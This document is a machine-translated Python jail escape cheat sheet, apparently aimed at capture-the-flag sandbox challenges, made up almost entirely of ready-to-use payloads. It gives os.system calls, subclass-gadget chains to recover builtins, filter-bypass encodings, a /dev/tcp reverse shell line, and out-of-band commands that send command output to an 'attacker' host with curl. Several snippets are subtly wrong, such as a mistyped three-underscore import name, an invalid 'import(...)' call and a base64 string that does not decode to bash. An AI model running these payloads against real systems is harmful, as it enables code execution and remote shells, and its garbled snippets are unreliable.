# Python Jail Escape Manual

## Escape decision tree

```
Input is. eval/exec
├── Can import?
│   ├── Can → __import__('os').system('id')
│   └── Cannot → Find builtins
├── Can access __builtins__?
│   ├── Can → Utilize __builtins__ Find available functions
│   └── Cannot → Find Other Reference Chains
├── Is There Filtering?
│   ├── Filter underscore → Find functions without underscores
│   ├── Filter quotes → Use StringIO/chr()
│   └── Filter square brackets → Use .format() Or getattr
└── Character limit?
    ├── Only letters → Use chr() Construct arbitrary characters
    ├── Length limit → Short payload
    └── Only allow digits → Complex encoding
```

## Base escape chain

### 1. Execute commands directly
```python
__import__('os').system('id')
__import__('os').popen('id').read()
eval("__import__('os').system('id')")
exec("__import__('os').system('id')")
```

### 2. Pass builtins
```python
__builtins__.__dict__['__import__']('os').system('id')
getattr(getattr(__builtins__, '__im' + 'port__'), 'os').system('id')
```

### 3. Pass func_globals
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('id')
```

### 4. Pass type()
```python
type(type(os))
(type.__subclasses__())
```

### 5. Pass Warning/Exception
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').system('id')")
```

## Common Subclass Index (print Find index)

```python
# List all available subclasses
print([c.__name__ for c in __builtins__.__dict__.values() if type(c).__name__ == 'type'])

# Or traverse to find a specific class
for i, c in enumerate([].__class__.__base__.__subclasses__()):
    print(i, c.__name__)
```

## Commonly used Gadgets

| Class name | index | use |
|------|------|------|
| `catch_warnings` | ~59 | get `__builtins__` |
| `_io._IOBase` | ~80 | File operations |
| `Popen` | ~200+ | command execution |
| `subprocess.Popen` | dynamic | command execution |

## Bypass filtering

### Underlines are filtered
```python
getattr(getattr(__builtins__, '\x5f\x5fclass\x5f\x5f'), '\x5f\x5f\x5fimport\x5f\x5f')('os').system('id')

# Or use request object(Flask)
request.environ['werkzeug.server.shutdown']
```

### Quotes are filtered
```python
chr(95)*2  # '__'
# Or use StringIO
import('so'[::-1], fromlist=['os']).system('id')
```

### Square brackets are filtered
```python
getattr(__import__('os'), 'system')('id')
# use .__getattribute__ replace getattr
```

### Numbers are filtered
```python
# use True/False Construct numbers
True.__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']
# True = 1, False = 0
```

### length limit
```python
# shortest rebound shell
__import__('os').system('bash -i >& /dev/tcp/IP/PORT 0>&1')

# or base64 Decode execution
__import__('base64').b64decode('bWFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDAmPnxkZXYvdGNwL0lQL1BPUlQK').decode()
```

## Common filter bypass character sets

| Bypass method | Applicable characters |
|---------|---------|
| `chr()` | all visible characters |
| `hex()` / `oct()` | digital construction |
| `[::-1]` reverse | `so"[::-1]` = `os` |
| `+` Splicing | `'os'[0]+'stem'` |
| variable assignment | `c='o'+'s';__import__(c)` |

## No echo detection
```python
# If there is no echo when the command is executed, verify it in the following way
__import__('os').system('curl http://attacker/?$(id)')
__import__('os').system('ping -c1 attacker.com')
```
